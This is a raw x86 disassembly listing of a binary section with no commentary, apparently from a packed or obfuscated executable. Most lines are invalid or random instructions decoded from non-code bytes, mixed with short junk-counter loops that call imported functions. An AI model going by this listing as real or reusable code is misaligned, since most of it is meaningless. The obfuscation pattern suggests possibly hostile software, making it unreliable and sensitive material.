  409f9b:	es mov edi,0xc77484ba
  409fa1:	inc    ecx
  409fa2:	xadd   BYTE PTR [eax],dh
  409fa5:	int3   
  409fa6:	call   DWORD PTR [edi+0x74]
  409fa9:	call   0x64d5:0xdeab9e6e
  409fb0:	and    DWORD PTR [esi],0x4526818
  409fb6:	jnp    0x409fdb
  409fb8:	dec    esi
  409fb9:	es push esp
  409fbb:	cmc    
  409fbc:	pop    ebx
  409fbd:	add    DWORD PTR [ecx],0x2449eba6
  409fc3:	icebp  
  409fc4:	inc    esp
  409fc5:	or     DWORD PTR [ecx+edi*8],ecx
  409fc8:	cmc    
  409fc9:	mov    ds:0x2554d506,eax
  409fce:	stc    
  409fcf:	jmp    0x3ae3:0x73d13bfd
  409fd6:	dec    esi
  409fd7:	pop    ebx
  409fd8:	pop    es
  409fd9:	push   esi
  409fda:	mov    WORD PTR [eax-0x7f],gs
  409fdd:	int    0x9b
  409fdf:	adc    eax,0x6edf5d15
  409fe4:	jo     0x40a047
  409fe6:	(bad)  
  409fe7:	nop
  409fe8:	xchg   edx,eax
  409fe9:	mov    ebx,0x59ca7141
  409fee:	not    BYTE PTR [edx]
  409ff0:	test   eax,0xc6df0c3b
  409ff5:	retf   0xf504
  409ff8:	xchg   BYTE PTR [ebx+esi*2-0x20ff75d1],ch
  409fff:	push   cs
  40a000:	shl    ecx,0x26
  40a003:	sbb    cl,bl
  40a005:	adc    eax,0x8ec75f5e
  40a00a:	rol    BYTE PTR [eax-0x7a],0xa0
  40a00e:	int3   
  40a00f:	pushf  
  40a010:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a011:	ins    BYTE PTR es:[edi],dx
  40a012:	push   ebx
  40a013:	test   esp,esp
  40a015:	jb     0x409ffb
  40a017:	mov    eax,0xd139d0d8
  40a01c:	outs   dx,BYTE PTR ds:[esi]
  40a01d:	mov    esi,0x1cb041c3
  40a022:	inc    esi
  40a023:	adc    bh,bh
  40a025:	xchg   ebx,eax
  40a026:	pop    edi
  40a027:	inc    ebx
  40a028:	fstp   DWORD PTR [ecx]
  40a02a:	add    DWORD PTR [edi-0x6a74cc40],eax
  40a030:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a031:	xchg   esp,eax
  40a032:	loop   0x40a097
  40a034:	clc    
  40a035:	rcr    BYTE PTR [esi+0x17bc8dbc],0x8b
  40a03c:	dec    ebp
  40a03d:	or     BYTE PTR [ecx+0x7e901],cl
  40a043:	add    BYTE PTR [eax],al
  40a045:	xor    DWORD PTR [ebp-0x4],0xe149ebf
  40a04c:	mov    ax,WORD PTR [ebp-0x8]
  40a050:	push   DWORD PTR [ebp+0x8]
  40a053:	call   0x40a064
  40a058:	test   eax,eax
  40a05a:	je     0x40a045
  40a060:	leave  
  40a061:	ret    0x4
  40a064:	push   ebp
  40a065:	mov    ebp,esp
  40a067:	sub    esp,0x2c
  40a06a:	and    DWORD PTR ds:0x42a765,0x0
  40a074:	jmp    0x40a084
  40a079:	mov    eax,ds:0x42a765
  40a07e:	inc    eax
  40a07f:	mov    ds:0x42a765,eax
  40a084:	cmp    DWORD PTR ds:0x42a765,0x12
  40a08b:	jae    0x40a110
  40a091:	cmp    DWORD PTR ds:0x42a765,0x22
  40a098:	jne    0x40a0b2
  40a09e:	push   DWORD PTR [ebp-0x14]
  40a0a1:	push   0x6f60
  40a0a6:	push   DWORD PTR [ebp-0x24]
  40a0a9:	push   DWORD PTR [ebp-0x10]
  40a0ac:	call   DWORD PTR ds:0x41d198
  40a0b2:	jmp    0x40a079
  40a0b7:	and    DWORD PTR ds:0x42a871,0x0
  40a0c1:	jmp    0x40a0d1
  40a0c6:	mov    eax,ds:0x42a871
  40a0cb:	inc    eax
  40a0cc:	mov    ds:0x42a871,eax
  40a0d1:	cmp    DWORD PTR ds:0x42a871,0x11
  40a0d8:	jae    0x40a110
  40a0de:	cmp    DWORD PTR ds:0x42a871,0x1e
  40a0e5:	jne    0x40a0fb
  40a0eb:	push   0x89ca
  40a0f0:	push   0x6edd
  40a0f5:	call   DWORD PTR ds:0x41d244
  40a0fb:	jmp    0x40a0c6
  40a100:	mov    ecx,DWORD PTR ds:0x42a78d
  40a106:	mov    eax,ds:0x42a869
  40a10b:	sub    eax,ecx
  40a10d:	xor    ecx,DWORD PTR [ecx+eax*1]
  40a110:	mov    DWORD PTR [ebp-0x8],0xf89c8539
  40a117:	mov    ecx,DWORD PTR ds:0x42a855
  40a11d:	xor    eax,eax
  40a11f:	or     eax,DWORD PTR ds:0x42a891
  40a125:	sub    ecx,eax
  40a127:	imul   ecx,DWORD PTR [ecx+eax*1]
  40a12b:	mov    DWORD PTR [ebp-0x14],0xf89c8538
  40a132:	and    DWORD PTR ds:0x42a761,0x0
  40a13c:	jmp    0x40a14e
  40a141:	mov    ecx,DWORD PTR ds:0x42a761
  40a147:	inc    ecx
  40a148:	mov    DWORD PTR ds:0x42a761,ecx
  40a14e:	cmp    DWORD PTR ds:0x42a761,0x1d
  40a155:	jae    0x40a192
  40a15b:	cmp    DWORD PTR ds:0x42a761,0xb
  40a162:	jne    0x40a173
  40a168:	push   0x3d1a
  40a16d:	call   DWORD PTR ds:0x41d19c
  40a173:	cmp    DWORD PTR ds:0x42a761,0xa
  40a17a:	jne    0x40a18d
  40a180:	mov    ecx,DWORD PTR ds:0x42a761
  40a186:	inc    ecx
  40a187:	mov    DWORD PTR ds:0x42a761,ecx
  40a18d:	jmp    0x40a141
  40a192:	mov    eax,0x9567
  40a197:	mov    WORD PTR [ebp-0x4],ax
  40a19b:	add    DWORD PTR ds:0x42a7bd,ecx
  40a1a1:	jmp    0x40a4ba
  40a1a6:	cmp    al,0xc8
  40a1a8:	ret    0xd2d2
  40a1ab:	ror    ah,cl
  40a1ad:	into   
  40a1ae:	jge    0x40a22b
  40a1b0:	enter  0xae60,0x21
  40a1b4:	adc    BYTE PTR [eax-0x1e],dh
  40a1b7:	stc    
  40a1b8:	js     0x40a232
  40a1ba:	je     0x40a23a
  40a1bc:	js     0x40a236
  40a1be:	data16 (bad) 
  40a1c0:	and    DWORD PTR [edi-0x4b],edx
  40a1c3:	test   DWORD PTR [ebx+0x4498e694],ebx
  40a1c9:	pop    esp
  40a1ca:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a1cb:	lods   al,BYTE PTR ds:[esi]
  40a1cc:	inc    ebp
  40a1cd:	not    DWORD PTR [ebp-0x5f]
  40a1d0:	push   ebx
  40a1d1:	and    bh,BYTE PTR [ebx+0x20]
  40a1d4:	dec    esi
  40a1d5:	es repnz xchg ecx,eax
  40a1d8:	(bad)  
  40a1d9:	dec    esp
  40a1da:	scas   eax,DWORD PTR es:[edi]
  40a1db:	mov    al,ds:0x1f99c83c
  40a1e0:	dec    edx
  40a1e1:	fild   WORD PTR [edx+edx*2]
  40a1e4:	adc    BYTE PTR [edx-0x2b21fb8e],al
  40a1ea:	mov    DWORD PTR [ecx+esi*2-0x1e],eax
  40a1ee:	mov    edi,0x1cdba61d
  40a1f3:	add    DWORD PTR [ecx+0xc44159],esp
  40a1f9:	push   ds
  40a1fa:	fmul   DWORD PTR [esi]
  40a1fc:	sub    edi,DWORD PTR [ecx-0x7b]
  40a1ff:	pop    es
  40a200:	(bad)  
  40a201:	stos   BYTE PTR es:[edi],al
  40a202:	xchg   edi,eax
  40a203:	das    
  40a204:	retf   
  40a205:	pop    ecx
  40a206:	or     eax,0xf75e27a8
  40a20b:	test   eax,0x36f20028
  40a210:	in     al,dx
  40a211:	inc    ebp
  40a212:	test   DWORD PTR [ecx+0x2365fc25],edx
  40a218:	mov    ebx,0x344db3fe
  40a21d:	test   BYTE PTR [esi+0x42],bh
  40a220:	and    eax,0x3df64a9c
  40a225:	inc    esp
  40a226:	mov    ch,0xa4
  40a228:	fistp  DWORD PTR ds:0x222d904
  40a22e:	add    eax,0x42e84a2f
  40a233:	mov    DWORD PTR [ebx+0x7e35fd8a],eax
  40a239:	or     eax,0xfae0a759
  40a23e:	inc    ecx
  40a23f:	scas   eax,DWORD PTR es:[edi]
  40a240:	jg     0x40a2a2
  40a242:	cmp    ah,BYTE PTR ds:0x63b7e6bc
  40a248:	lods   al,BYTE PTR ds:[esi]
  40a249:	add    BYTE PTR [edx-0x37803c0],bh
  40a24f:	hlt    
  40a250:	mov    edx,0x2e86b359
  40a255:	mov    al,ds:0x9c916de9
  40a25a:	jnp    0x40a29a
  40a25c:	and    eax,0x4c54bd3a
  40a261:	push   ss
  40a262:	ret    0x5f8a
  40a265:	adc    BYTE PTR [ecx],ah
  40a267:	adc    DWORD PTR [edx+eiz*8],esi
  40a26a:	pop    ds
  40a26b:	std    
  40a26c:	dec    esi
  40a26d:	call   0x5bb0:0xdfce5815
  40a274:	mov    ecx,0x2200d229
  40a279:	cmp    DWORD PTR [edx],esi
  40a27b:	mov    esp,0xc4d672dc
  40a280:	sub    BYTE PTR [eax-0x1d5642aa],dh
  40a286:	xchg   ebp,eax
  40a287:	dec    ecx
  40a288:	sbb    al,0x2a
  40a28a:	leave  
  40a28b:	mov    ebp,0xdfaece46
  40a290:	arpl   WORD PTR [edi+0x7e],si
  40a293:	cmp    eax,0x830164dd
  40a298:	sub    edx,DWORD PTR [esi+0x4ef5464c]
  40a29e:	ror    BYTE PTR [edi-0x62d6b87f],0x83
  40a2a5:	inc    edx
  40a2a6:	das    
  40a2a7:	and    BYTE PTR [edx-0xb],bh
  40a2aa:	js     0x40a2f9
  40a2ac:	shr    BYTE PTR [edi+0x2ec0c55a],0xdf
  40a2b3:	pop    ecx
  40a2b4:	mov    cl,0x6b
  40a2b6:	adc    BYTE PTR [edx+0x53],0xee
  40a2ba:	in     eax,dx
  40a2bb:	arpl   WORD PTR [ebx+0x2bd5860c],dx
  40a2c1:	add    eax,0x76f298f7
  40a2c6:	es push esp
  40a2c8:	call   DWORD PTR [edx+0x2f]
  40a2cb:	xchg   ebp,eax
  40a2cc:	mov    eax,0x21aebd7f
  40a2d1:	mov    ebp,0x9afcf26c
  40a2d6:	mov    ds:0x23a649cf,al
  40a2db:	jge    0x40a312
  40a2dd:	and    eax,0x6cc12982
  40a2e2:	add    edx,esp
  40a2e4:	xchg   ebx,eax
  40a2e5:	jl     0x40a2db
  40a2e7:	ins    BYTE PTR es:[edi],dx
  40a2e8:	lock test eax,0xf2e8e08d
  40a2ee:	(bad)  
  40a2ef:	(bad)  
  40a2f0:	in     al,dx
  40a2f1:	out    dx,eax
  40a2f2:	mov    eax,0x20856451
  40a2f7:	lods   eax,DWORD PTR ds:[esi]
  40a2f8:	leave  
  40a2f9:	sbb    ch,dh
  40a2fb:	imul   edi,DWORD PTR [edi-0x5b16e296],0x2c
  40a302:	jp     0x40a292
  40a304:	sub    eax,0x8cfc0b20
  40a309:	adc    DWORD PTR [ebx],ecx
  40a30b:	add    eax,0xb09324a3
  40a310:	sub    DWORD PTR ds:0x30d4eab2,0x4f
  40a317:	addr16 adc esp,eax
  40a31a:	dec    edx
  40a31b:	pop    ss
  40a31c:	mov    BYTE PTR [edi+0x79ed1d75],al
  40a322:	dec    ecx
  40a323:	mov    edx,0x92792f1f
  40a328:	out    0xc,eax
  40a32a:	ret    0x64f5
  40a32d:	retf   
  40a32e:	dec    edi
  40a32f:	sub    al,0xea
  40a331:	inc    esi
  40a332:	lea    esi,[edx-0x33f79108]
  40a338:	jb     0x40a370
  40a33a:	iret   
  40a33b:	pop    esi
  40a33c:	fmul   st(7),st
  40a33e:	sar    ah,1
  40a340:	jo     0x40a2d5
  40a342:	ins    DWORD PTR es:[edi],dx
  40a343:	or     DWORD PTR [edx],ecx
  40a345:	sub    edx,ebp
  40a347:	sub    edx,DWORD PTR [edi]
  40a349:	test   BYTE PTR [edx-0x1aada156],cl
  40a34f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a350:	gs sub eax,0xfbdbeea7
  40a356:	or     eax,0xe5d9eca4
  40a35b:	int3   
  40a35c:	out    0x73,al
  40a35e:	les    ebx,FWORD PTR [bp+si-0x60b7]
  40a363:	pop    ss
  40a364:	aas    
  40a365:	dec    edx
  40a366:	(bad)  
  40a367:	push   esi
  40a368:	mov    edi,0xed298d07
  40a36d:	addr16 pusha 
  40a36f:	stc    
  40a370:	mov    al,0x8c
  40a372:	xchg   ebp,eax
  40a373:	inc    esi
  40a374:	imul   ecx,DWORD PTR [edi+0x1e],0xffffffc8
  40a378:	add    BYTE PTR [ebx-0x2bf8b3f0],bl
  40a37e:	nop
  40a37f:	ror    dh,0x2c
  40a382:	loope  0x40a37b
  40a384:	in     eax,dx
  40a385:	test   al,0xa6
  40a387:	xchg   edi,eax
  40a388:	mov    esi,0xb742fa45
  40a38d:	das    
  40a38e:	enter  0xeab0,0xae
  40a392:	push   ecx
  40a393:	jno    0x40a363
  40a395:	cmp    edi,eax
  40a397:	mov    eax,0x1fa1997e
  40a39c:	neg    BYTE PTR [eax-0x13]
  40a39f:	xchg   ebx,eax
  40a3a0:	int    0x69
  40a3a2:	add    al,0xb7
  40a3a4:	call   0xeae6:0xdf53809
  40a3ab:	sub    ah,BYTE PTR [ecx]
  40a3ad:	in     eax,0x6e
  40a3af:	rcr    BYTE PTR [ebx-0x61],1
  40a3b2:	fcmovnb st,st(0)
  40a3b4:	adc    bh,BYTE PTR [edi]
  40a3b6:	dec    ecx
  40a3b7:	push   ebx
  40a3b8:	imul   esp,DWORD PTR [ebp+ecx*1-0x278d2721],0x39
  40a3c0:	jnp    0x40a396
  40a3c2:	out    dx,eax
  40a3c3:	mov    BYTE PTR [eax+0x3f0b8de1],ch
  40a3c9:	mov    edx,0xf702a8b0
  40a3ce:	fld    QWORD PTR [eax+ebp*2]
  40a3d1:	loop   0x40a40d
  40a3d3:	xor    BYTE PTR [ebx+0x36cfcb37],0x41
  40a3da:	push   ebx
  40a3db:	mov    dl,BYTE PTR [ebx+eiz*1-0x62c409bf]
  40a3e2:	loope  0x40a36a
  40a3e4:	in     al,0xfe
  40a3e6:	ja     0x40a45a
  40a3e8:	mov    ds:0xf0670a80,eax
  40a3ed:	cmc    
  40a3ee:	int3   
  40a3ef:	mov    cl,BYTE PTR [edi+ebp*2]
  40a3f2:	sbb    eax,DWORD PTR [esi]
  40a3f4:	xchg   edi,eax
  40a3f5:	retf   
  40a3f6:	ds mov ecx,0x1329416a
  40a3fc:	add    ebp,esp
  40a3fe:	test   edx,edx
  40a400:	jp     0x40a463
  40a402:	sub    esi,DWORD PTR [eax+0x6e]
  40a405:	pop    ss
  40a406:	popf   
  40a407:	imul   ebp,edi,0xc1a992b0
  40a40d:	std    
  40a40e:	pop    ebx
  40a40f:	out    dx,eax
  40a410:	in     al,dx
  40a411:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a412:	shl    BYTE PTR [ebx],cl
  40a414:	cmp    DWORD PTR [ecx],ebp
  40a416:	mov    BYTE PTR [esi+ebx*4+0xe],bl
  40a41a:	pop    ds
  40a41b:	inc    dx
  40a41d:	(bad)  
  40a41f:	or     al,BYTE PTR [esi]
  40a421:	mov    DWORD PTR [edx+0x0],ebp
  40a424:	mov    bl,0xa2
  40a426:	pop    ebx
  40a427:	or     cl,bh
  40a429:	inc    eax
  40a42a:	xchg   edx,eax
  40a42b:	jo     0x40a3df
  40a42d:	add    edi,ebx
  40a42f:	int    0xf8
  40a431:	(bad)  
  40a432:	call   0xa72cc690
  40a437:	pop    ecx
  40a438:	adc    dh,0xff
  40a43b:	xor    DWORD PTR [edx+0x5fedfa7c],ebx
  40a441:	xor    BYTE PTR [ebx-0x3e1cae7d],bh
  40a447:	js     0x40a4b4
  40a449:	js     0x40a416
  40a44b:	out    dx,eax
  40a44c:	arpl   WORD PTR [ebx-0x4eedc953],bp
  40a452:	xchg   ecx,eax
  40a453:	xchg   esi,eax
  40a454:	lods   al,BYTE PTR ds:[esi]
  40a455:	dec    ebx
  40a456:	in     al,dx
  40a457:	sbb    BYTE PTR [ebx],dh
  40a459:	(bad)  
  40a45a:	dec    esi
  40a45b:	(bad)  
  40a45c:	dec    ebp
  40a45d:	(bad)  
  40a45e:	outs   dx,BYTE PTR ds:[esi]
  40a45f:	bound  esp,QWORD PTR [edx-0x63b80ec6]
  40a465:	or     ebp,ebx
  40a467:	push   0x6d354d05
  40a46c:	scas   eax,DWORD PTR es:[edi]
  40a46d:	fs sbb ebp,eax
  40a470:	div    edx
  40a472:	xor    BYTE PTR [edi],0x4f
  40a475:	push   edx
  40a476:	jmp    0x60ee:0x16a6f4
  40a47d:	pop    ebx
  40a47e:	in     eax,0x38
  40a480:	sbb    bl,BYTE PTR [ecx-0x3659ca7c]
  40a486:	cdq    
  40a487:	inc    edi
  40a488:	mov    cs,WORD PTR [eax-0x206f67f9]
  40a48e:	jg     0x40a4a6
  40a490:	mov    ebx,0xc7a988ef
  40a495:	and    al,0xd8
  40a497:	data16 and dh,cl
  40a49a:	ds push edx
  40a49c:	pop    esp
  40a49d:	addr16 into 
  40a49f:	pop    ebx
  40a4a0:	push   ds
  40a4a1:	je     0x40a4e1
  40a4a3:	push   es
  40a4a4:	stc    
  40a4a5:	push   ds
  40a4a6:	jo     0x40a4c1
  40a4a8:	ins    BYTE PTR es:[edi],dx
  40a4a9:	mov    ebp,DWORD PTR [eax]
  40a4ab:	ret    0xa03a
  40a4ae:	ret    0xe3a4
  40a4b1:	aam    0x94
  40a4b3:	call   0x6ff4f20a
  40a4b8:	outs   dx,DWORD PTR ds:[esi]
  40a4b9:	or     BYTE PTR [ebp+0x2581dc45],cl
  40a4bf:	int    0xa7
  40a4c1:	inc    edx
  40a4c2:	add    ch,dh
  40a4c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4c5:	inc    edx
  40a4c6:	add    BYTE PTR [ecx+0x2d81d845],cl
  40a4cc:	mov    DWORD PTR [eax+0x30d00042],ebp
  40a4d2:	add    BYTE PTR [eax],al
  40a4d4:	mov    eax,DWORD PTR [ebp+0x8]
  40a4d7:	or     ecx,0x3ba0
  40a4dd:	mov    DWORD PTR [ebp-0x20],eax
  40a4e0:	and    DWORD PTR ds:0x42a771,0x0
  40a4ea:	mov    ecx,DWORD PTR ds:0x42a771
  40a4f0:	inc    ecx
  40a4f1:	mov    DWORD PTR ds:0x42a771,ecx
  40a4f7:	cmp    DWORD PTR ds:0x42a771,0xc
  40a4fe:	jne    0x40a50d
  40a504:	push   DWORD PTR [ebp-0x24]
  40a507:	call   DWORD PTR ds:0x41d1a0
  40a50d:	cmp    DWORD PTR ds:0x42a771,0xb
  40a514:	jne    0x40a527
  40a51a:	mov    ecx,DWORD PTR ds:0x42a771
  40a520:	inc    ecx
  40a521:	mov    DWORD PTR ds:0x42a771,ecx
  40a527:	cmp    DWORD PTR ds:0x42a771,0x15
  40a52e:	jb     0x40a4ea
  40a534:	push   ebx
  40a535:	lea    eax,[ebp-0x18]
  40a538:	mov    ebx,DWORD PTR ds:0x42a79d
  40a53e:	mov    ecx,DWORD PTR ds:0x42a851
  40a544:	sub    ecx,ebx
  40a546:	and    ebx,DWORD PTR [ebx+ecx*1]
  40a549:	mov    DWORD PTR [ebp-0x1c],eax
  40a54c:	mov    eax,DWORD PTR [ebp-0x1c]
  40a54f:	and    DWORD PTR ds:0x42a881,0x0
  40a559:	jmp    0x40a56d
  40a55e:	xor    ebx,ebx
  40a560:	add    ebx,DWORD PTR ds:0x42a881
  40a566:	inc    ebx
  40a567:	mov    DWORD PTR ds:0x42a881,ebx
  40a56d:	cmp    DWORD PTR ds:0x42a881,0x15
  40a574:	jae    0x40a597
  40a57a:	cmp    DWORD PTR ds:0x42a881,0x25
  40a581:	jne    0x40a592
  40a587:	push   0x6372
  40a58c:	call   DWORD PTR ds:0x41d0cc
  40a592:	jmp    0x40a55e
  40a597:	push   esi
  40a598:	and    DWORD PTR ds:0x42a849,0x0
  40a5a2:	mov    ebx,DWORD PTR ds:0x42a849
  40a5a8:	inc    ebx
  40a5a9:	mov    DWORD PTR ds:0x42a849,ebx
  40a5af:	cmp    DWORD PTR ds:0x42a849,0x7
  40a5b6:	jne    0x40a5dc
  40a5bc:	push   DWORD PTR [ebp-0x14]
  40a5bf:	push   0x2cb6
  40a5c4:	push   DWORD PTR [ebp-0x1c]
  40a5c7:	push   0x8d7c
  40a5cc:	push   0x42aa62
  40a5d1:	push   0x400000
  40a5d6:	call   DWORD PTR ds:0x41d248
  40a5dc:	cmp    DWORD PTR ds:0x42a849,0x6
  40a5e3:	jne    0x40a5f6
  40a5e9:	mov    ebx,DWORD PTR ds:0x42a849
  40a5ef:	inc    ebx
  40a5f0:	mov    DWORD PTR ds:0x42a849,ebx
  40a5f6:	cmp    DWORD PTR ds:0x42a849,0x1b
  40a5fd:	jb     0x40a5a2
  40a603:	push   edi
  40a604:	mov    edi,0xf89f2e50
  40a609:	jmp    0x40a922
  40a60e:	(bad)  
  40a60f:	ror    bh,0xca
  40a612:	int    0xd9
  40a614:	(bad)  
  40a616:	dec    eax
  40a617:	xor    BYTE PTR [edi+edi*2-0x5b],dh
  40a61b:	jge    0x40a600
  40a61d:	add    esi,ebx
  40a61f:	(bad)  
  40a620:	js     0x40a69a
  40a622:	je     0x40a6a2
  40a624:	js     0x40a69e
  40a626:	pop    edi
  40a627:	mov    ds:0x30a730e1,al
  40a62c:	cmp    esp,DWORD PTR ds:0xc280878
  40a632:	adc    ah,BYTE PTR [eax+0x9]
  40a635:	scas   eax,DWORD PTR es:[edi]
  40a636:	loopne 0x40a648
  40a638:	cmc    
  40a639:	push   ds
  40a63a:	test   al,0x3b
  40a63c:	cwde   
  40a63d:	push   ss
  40a63e:	add    eax,0xa1a35e08
  40a643:	xor    BYTE PTR [eax],dl
  40a645:	add    al,0xe0
  40a647:	mov    ds:0x86ce1eca,eax
  40a64c:	mov    ds:0xecce1e21,al
  40a651:	mov    bl,0x53
  40a653:	sbb    BYTE PTR [esi+0x4],bh
  40a656:	inc    ebx
  40a657:	mov    ds:0x1f992ea9,eax
  40a65c:	ja     0x40a64f
  40a65e:	fucomp st(5)
  40a660:	inc    ebx
  40a661:	ds pop eax
  40a663:	cdq    
  40a664:	xchg   edx,eax
  40a665:	mov    ah,0xae
  40a667:	repnz out dx,eax
  40a669:	adc    BYTE PTR [eax-0x50713095],cl
  40a66f:	sub    eax,0xa08d7285
  40a674:	sub    ebx,ebp
  40a676:	mov    cl,0x25
  40a678:	mov    cl,0xc3
  40a67a:	sub    BYTE PTR [ebp-0xcee88e2],ch
  40a680:	pop    esi
  40a681:	aad    0x69
  40a683:	gs (bad) 
  40a686:	jmp    0x916b8f4
  40a68b:	es push es
  40a68d:	inc    ecx
  40a68e:	out    0x16,al
  40a690:	add    DWORD PTR [ecx+ecx*2-0x2e69e235],ecx
  40a697:	test   al,0xe
  40a699:	test   al,0xe3
  40a69b:	shl    esp,cl
  40a69d:	inc    edi
  40a69e:	test   eax,0x2326beed
  40a6a3:	pop    edi
  40a6a4:	std    
  40a6a5:	hlt    
  40a6a6:	mov    WORD PTR [ebx+edx*4+0x7e9a0639],gs
  40a6ad:	js     0x40a6f8
  40a6af:	pop    esp
  40a6b0:	mov    esi,0x6c7c22f4
  40a6b5:	cwde   
  40a6b6:	sbb    ch,BYTE PTR [ecx-0x101e6605]
  40a6bc:	into   
  40a6bd:	jmp    0x542f5ad7
  40a6c2:	mov    edi,0xc804ccd8
  40a6c7:	rcl    dh,1
  40a6c9:	or     al,0xf8
  40a6cb:	xchg   DWORD PTR [edx-0x2443e574],edi
  40a6d1:	mov    esi,0xf957cff0
  40a6d6:	retf   0x3c0e
  40a6d9:	repz and BYTE PTR [ebx+0x42402465],ah
  40a6e0:	jns    0x40a745
  40a6e2:	jns    0x40a706
  40a6e4:	popf   
  40a6e5:	sbb    esp,DWORD PTR [edi]
  40a6e7:	push   edi
  40a6e8:	or     bh,BYTE PTR [ecx+0x52]
  40a6eb:	cmp    bl,BYTE PTR [edx+0x16339679]
  40a6f1:	jmp    0x40a697
  40a6f3:	lea    esp,[edi]
  40a6f5:	jnp    0x40a723
  40a6f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6f8:	js     0x40a6c3
  40a6fa:	arpl   WORD PTR [esi],ax
  40a6fc:	ja     0x40a6be
  40a6fe:	test   BYTE PTR [eax+edi*4-0x17],dh
  40a702:	xor    bh,BYTE PTR [esi]
  40a704:	aad    0x39
  40a706:	bound  esi,QWORD PTR [esi+0x7c1c4f03]
  40a70c:	xchg   ebp,eax
  40a70d:	out    dx,eax
  40a70e:	xlat   BYTE PTR ds:[ebx]
  40a70f:	sbb    edx,0x61
  40a712:	outs   dx,DWORD PTR ds:[esi]
  40a713:	test   al,0x87
  40a715:	mov    DWORD PTR [edi],0xc1f1bbe2
  40a71b:	lods   al,BYTE PTR ds:[esi]
  40a71c:	loope  0x40a6f1
  40a71e:	test   DWORD PTR [eax+0x38c2b78f],ebp
  40a724:	add    eax,0xb3408242
  40a729:	pop    es
  40a72a:	cmp    DWORD PTR ds:0x5966ad2c,esi
  40a730:	adc    al,BYTE PTR [ebp-0x1d]
  40a733:	aaa    
  40a734:	mov    ebx,0xd445ed0a
  40a739:	sbb    ch,BYTE PTR ds:0xea3dc225
  40a73f:	pusha  
  40a740:	pop    ds
  40a741:	dec    edx
  40a742:	(bad)  
  40a743:	call   0x6143c88b
  40a748:	jge    0x40a79e
  40a74a:	ss pop eax
  40a74c:	out    0xec,al
  40a74e:	adc    ebx,DWORD PTR [ecx]
  40a750:	ins    BYTE PTR es:[edi],dx
  40a751:	push   ebp
  40a752:	pop    ss
  40a753:	and    DWORD PTR [edx+0xb646c42],esp
  40a759:	call   0x34e6b8bd
  40a75e:	jmp    0x9885:0x3b3caf67
  40a765:	pop    ss
  40a766:	in     eax,0xa0
  40a768:	cli    
  40a769:	popf   
  40a76a:	pop    ss
  40a76b:	call   0x6c98:0x8031b7c4
  40a772:	mov    dl,BYTE PTR [ebx]
  40a774:	and    dh,0xa9
  40a777:	sbb    ah,BYTE PTR [ebp-0x2f]
  40a77a:	adc    bl,BYTE PTR [esi+edi*1-0x4f]
  40a77e:	or     BYTE PTR [esi],dl
  40a780:	cmp    eax,0x3842b540
  40a785:	sbb    eax,0x6320df03
  40a78a:	sbb    al,0x1c
  40a78c:	dec    esp
  40a78d:	jge    0x40a72b
  40a78f:	mov    ds:0x55b63eab,al
  40a794:	jo     0x40a726
  40a796:	(bad)  
  40a798:	outs   dx,BYTE PTR ds:[esi]
  40a799:	jge    0x40a7e1
  40a79b:	push   esp
  40a79c:	(bad)  
  40a79d:	fdiv   st(2),st
  40a79f:	(bad)  
  40a7a0:	xor    DWORD PTR [eax+ebp*2-0x35a69989],ebp
  40a7a7:	retf   
  40a7a8:	std    
  40a7a9:	adc    ebp,DWORD PTR [ecx]
  40a7ab:	cs fcom QWORD PTR fs:[bp+si+0x3]
  40a7b1:	sbb    ebx,ebp
  40a7b3:	dec    edi
  40a7b4:	aad    0x31
  40a7b6:	add    edi,ecx
  40a7b8:	jae    0x40a73e
  40a7ba:	lods   eax,DWORD PTR ds:[esi]
  40a7bb:	test   al,0x4e
  40a7bd:	pop    ebx
  40a7be:	dec    edx
  40a7bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7c0:	retf   
  40a7c1:	sub    ebp,ebx
  40a7c3:	sub    BYTE PTR [edi*2+0xf06d27e],dh
  40a7ca:	lods   eax,DWORD PTR ds:[esi]
  40a7cb:	inc    esp
  40a7cc:	fmul   DWORD PTR [ecx]
  40a7ce:	mov    ch,0xe6
  40a7d0:	mov    ds:0xe70d90c2,al
  40a7d5:	dec    ecx
  40a7d6:	fnop   
  40a7d8:	xchg   esp,eax
  40a7d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a7da:	arpl   bx,dx
  40a7dc:	xor    eax,0x2305bec0
  40a7e1:	xor    BYTE PTR [eax-0x28],ah
  40a7e4:	and    eax,0x19e0e644
  40a7e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a7ea:	stos   DWORD PTR es:[edi],eax
  40a7eb:	push   ebp
  40a7ec:	test   BYTE PTR [eax+0x5d13899a],cl
  40a7f2:	aas    
  40a7f3:	jnp    0x40a77e
  40a7f5:	xchg   edi,eax
  40a7f6:	and    al,0x75
  40a7f8:	in     al,dx
  40a7f9:	lock push edi
  40a7fb:	inc    edx
  40a7fc:	dec    esi
  40a7fd:	arpl   WORD PTR [esi],di
  40a7ff:	(bad)  
  40a800:	icebp  
  40a801:	xor    al,0x10
  40a803:	jmp    0x26fb:0xd119d79c
  40a80a:	push   cs
  40a80b:	cdq    
  40a80c:	pop    sp
  40a80e:	(bad)  
  40a80f:	jmp    0x653b2628
  40a814:	add    esp,esp
  40a816:	mov    bl,0xb7
  40a818:	or     al,al
  40a81a:	sub    bh,al
  40a81c:	imul   esp,DWORD PTR [esi-0x66bedc65],0x62e0a33e
  40a826:	bnd call 0x6910a684
  40a82c:	test   DWORD PTR [eax-0x26],ebx
  40a82f:	fwait
  40a830:	adc    dl,ah
  40a832:	int3   
  40a833:	mov    edx,0xed1328ff
  40a838:	jbe    0x40a821
  40a83a:	xor    esp,DWORD PTR gs:[edx-0x19]
  40a83e:	or     ah,dh
  40a840:	test   BYTE PTR [edi-0x787f80e],ch
  40a846:	test   DWORD PTR [ecx-0x1a232401],edi
  40a84c:	jae    0x40a847
  40a84e:	push   ds
  40a84f:	mov    al,ds:0xa2dc3b3e
  40a854:	jl     0x40a811
  40a856:	in     eax,0x3c
  40a858:	mov    WORD PTR [ecx+0x1a233e64],?
  40a85e:	inc    edx
  40a85f:	call   0x54d4:0x68c8f3bf
  40a866:	add    bh,BYTE PTR [ebx+eiz*8-0x65d8906e]
